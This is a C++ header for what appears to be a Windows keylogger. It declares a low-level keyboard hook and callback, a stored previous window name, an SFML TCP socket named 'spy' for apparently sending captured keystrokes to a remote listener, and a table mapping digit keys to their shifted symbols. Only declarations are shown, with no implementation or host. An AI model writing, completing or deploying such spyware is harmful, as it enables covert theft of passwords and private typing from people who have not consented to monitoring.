#pragma once
#include <SFML/Network.hpp>
#include <time.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <map>


bool transform(const int& key);

LRESULT keyBoardCallBack(int code, WPARAM wParam, LPARAM lParam);

static HHOOK hook;

static KBDLLHOOKSTRUCT kbStruct;

static std::string prevName;

static sf::TcpSocket spy;

static const std::map<decltype(VK_SHIFT), char> symbols
{
	{48, ')'},
	{49, '!'},
	{50, '@'},
	{51, '#'},
	{52, '$'},
	{53, '%'},
	{54, '^'},
	{55, '&'},
	{56, '*'},
	{57, '('}
};

